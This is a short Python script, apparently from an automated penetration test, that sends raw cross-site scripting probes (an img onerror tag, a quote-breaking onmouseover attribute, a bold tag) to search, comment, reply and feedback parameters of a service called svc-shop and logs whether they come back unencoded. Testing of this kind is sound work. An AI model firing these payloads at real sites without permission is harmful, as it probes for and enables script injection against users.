#!/usr/bin/env python3
# INT-r27-0012 补充轮: 双态对照——载荷原形（未 URL 编码）直接发送
# 判据：body 含 <img src=x onerror=probe7x9> / " onmouseover=probe7x9 " / <b>bold7x9</b> 原形=正（未编码回显）
import http.client, json, time

HOST, PORT = "svc-shop", 8001
CASES = []
for p in ["/search", "/comment", "/reply", "/feedback"]:
    for prm in ["q", "text", "msg"]:
        CASES.append((p, prm))
PAYLOADS = [
    ("x1-tag-raw", "<b>bold7x9</b>"),
    ("x2-event-raw", "<img src=x onerror=probe7x9>"),
    ("x3-quotebreak-raw", '" onmouseover=probe7x9 "'),
]

def send(path_query):
    c = http.client.HTTPConnection(HOST, PORT, timeout=8)
    c.request("GET", path_query, headers={"Host": "svc-shop:8001", "Connection": "close"})
    r = c.getresponse()
    body = r.read().decode("utf-8", "replace")
    hdrs = dict(r.getheaders())
    c.close()
    return r.status, hdrs, body

results = []
for p, prm in CASES:
    for tag, pl in PAYLOADS:
        q = prm + "=" + pl
        tgt = p + "?" + q
        time.sleep(0.25)
        try:
            s, h, b = send(tgt)
            results.append({"path": p, "query": q, "param": prm, "payload_tag": tag, "payload": pl,
                            "raw_request": "GET %s HTTP/1.1\r\nHost: svc-shop:8001\r\n\r\n" % tgt,
                            "status": s, "headers": h, "body": b})
        except Exception as e:
            results.append({"path": p, "query": q, "param": prm, "payload_tag": tag, "payload": pl, "error": repr(e)})

print(json.dumps({"intent": "INT-r27-0012", "round": 2, "target": "http://svc-shop:8001",
                  "count": len(results), "results": results}, ensure_ascii=False))
